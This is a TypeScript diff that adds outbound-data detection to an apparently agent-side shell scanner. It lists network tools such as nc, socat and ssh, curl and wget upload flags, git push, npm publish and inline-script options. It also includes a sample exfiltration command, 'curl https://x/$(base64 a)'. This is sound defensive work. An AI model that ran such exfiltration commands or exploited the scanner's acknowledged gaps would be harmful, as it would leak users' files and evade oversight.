@@ -25,6 +25,8 @@ export interface ShellScan {
   directories: string[];
   /** `.env` files named as an argument or an input redirect, which auto mode must not read unasked. */
   envFiles: string[];
+  /** Why a command can send data off this computer, e.g. `curl --data`, which auto mode must not run unasked. */
+  outbound: string[];
 }
 
 const CHANGES_DIRECTORY = new Set(['cd', 'chdir', 'pushd', 'popd']);
@@ -143,6 +145,100 @@ function globPrefix(text: string): string | null {
   return match.index === 0 ? null : text.slice(0, match.index);
 }
 
+// ponytail: a wrapper's own option values (`sudo -u bob`, `xargs -I {}`) are read as the program;
+// a full per-wrapper option table if that matters.
+const WRAPPERS = new Set(['sudo', 'env', 'command', 'exec', 'nohup', 'time', 'nice', 'timeout', 'xargs']);
+
+const ALWAYS_OUTBOUND = new Set(['scp', 'sftp', 'ftp', 'nc', 'ncat', 'netcat', 'socat', 'telnet', 'ssh']);
+
+const CURL_SENDS = /^(-d|--data.*|-F|--form.*|-T|--upload-file|--json)$/;
+const WGET_SENDS = /^--(post|body)-(data|file)$/;
+
+/** Options that run a script given inline, which can open a socket no scan of the text sees. */
+const INLINE_SCRIPT: Record<string, string[]> = {
+  node: ['-e', '--eval', '-p', '--print'],
+  ruby: ['-e'],
+  perl: ['-e', '-E'],
+  php: ['-r'],
+  bun: ['-e', '--eval'],
+  osascript: ['-e'],
+};
+
+/** The value an option sets, as `-X POST`, `-XPOST` or `--request=POST`; undefined when absent. */
+function optionValue(args: readonly string[], flags: readonly string[]): string | undefined {
+  for (let i = 0; i < args.length; i++) {
+    for (const flag of flags) {
+      if (args[i] === flag) return args[i + 1] ?? '';
+      const joined = flag.startsWith('--') ? `${flag}=` : flag;
+      if (args[i].startsWith(joined)) return args[i].slice(joined.length);
+    }
+  }
+  return undefined;
+}
+
+function sendsBody(method: string | undefined): boolean {
+  return method !== undefined && !/^(GET|HEAD)$/i.test(method);
+}
+
+/**
+ * Why one simple command can send data off this computer, or null. Defence in depth only: an
+ * `eval`, a script file or a wrapper not listed here slips past, which is why a reply that has read
+ * untrusted content asks before any command at all (see ChatService's DirectoryTurn.untrusted).
+ */
+export function outboundReason(raw: readonly string[]): string | null {
+  const tokens = raw.map(unquote);
+  let start = 0;
+  while (start < tokens.length && WRAPPERS.has(basename(tokens[start]))) {
+    start++;
+    while (start < tokens.length && /^(-|\d)|=/.test(tokens[start])) start++;
+  }
+  if (start >= tokens.length) return null;
+  const program = basename(tokens[start]);
+  const args = tokens.slice(start + 1);
+  // Any computed argument: `curl https://x/$(base64 a)` sends the file in a GET.
+  const computed = raw.slice(start + 1).some(isDynamic);
+
+  if (ALWAYS_OUTBOUND.has(program)) return program;
+  if (program === 'curl') {
+    const flag = args.find(
+      arg => CURL_SENDS.test(arg.split('=')[0]) || (!arg.startsWith('-X') && /^-[a-zA-Z]*[dFT]/.test(arg))
+    );
+    if (flag) return `curl ${flag.split('=')[0]}`;
+    if (sendsBody(optionValue(args, ['-X', '--request']))) return 'curl --request';
+    return computed ? 'curl with a computed argument' : null;
+  }
+  if (program === 'wget') {
+    const flag = args.find(arg => WGET_SENDS.test(arg.split('=')[0]));
+    if (flag) return `wget ${flag.split('=')[0]}`;
+    if (sendsBody(optionValue(args, ['--method']))) return 'wget --method';
+    return computed ? 'wget with a computed argument' : null;
+  }
+  if (program === 'rsync') {
+    return args.some(arg => !arg.startsWith('-') && (/^[^/]*:/.test(arg) || arg.startsWith('rsync://')))
+      ? 'rsync to a remote host'
+      : null;
+  }
+  if (program === 'git') {
+    const words: string[] = [];
+    for (let i = 0; i < args.length; i++) {
+      if (args[i] === '-C' || args[i] === '-c') i++;
+      else if (!args[i].startsWith('-')) words.push(args[i]);
+    }
+    const [sub, action] = words;
+    if (sub === 'push' || sub === 'send-email') return `git ${sub}`;
+    if (sub === 'remote' && (action === 'add' || action === 'set-url')) return `git remote ${action}`;
+    return null;
+  }
+  if (/^python[\d.]*$/.test(program)) return args.includes('-c') ? `${program} -c` : null;
+  if (program === 'deno') return args[0] === 'eval' ? 'deno eval' : null;
+  const inline = INLINE_SCRIPT[program]?.find(flag => args.some(arg => arg === flag || arg.startsWith(`${flag}=`)));
+  if (inline) return `${program} ${inline}`;
+  if ((program === 'npm' || program === 'pnpm' || program === 'yarn') && args.includes('publish')) {
+    return `${program} publish`;
+  }
+  return null;
+}
+
 function words(node: Node): string[] {
   const out: string[] = [];
   for (const child of node.namedChildren) {
@@ -180,6 +276,7 @@ export async function scanShell(
     const commands: ShellCommand[] = [];
     const directories = new Set<string>();
     const envFiles = new Set<string>();
+    const outbound = new Set<string>();
     const writtenCommands = new Set<number>();
 
     const noteEnvFile = (raw: string): void => {
@@ -226,6 +323,8 @@ export async function scanShell(
         always: `${arityPrefix(normalised).join(' ')} *`,
         coverable: !assigns && !writes && !arithmetic && droppedOnlySafeOptions(tokens),
       });
+      const sends = outboundReason(tokens);
+      if (sends) outbound.add(sends);
       for (const arg of rest) if (!arg.startsWith('-')) noteEnvFile(arg);
       for (const directory of directoryOptionValues(tokens)) await check(directory, state.cwd);
       if (!TOUCHES_FILES.has(program)) return;
@@ -311,7 +410,7 @@ export async function scanShell(
     };
 
     await visit(tree.rootNode);
-    return { commands, directories: [...directories], envFiles: [...envFiles] };
+    return { commands, directories: [...directories], envFiles: [...envFiles], outbound: [...outbound] };
   } finally {
     tree.delete();
   }
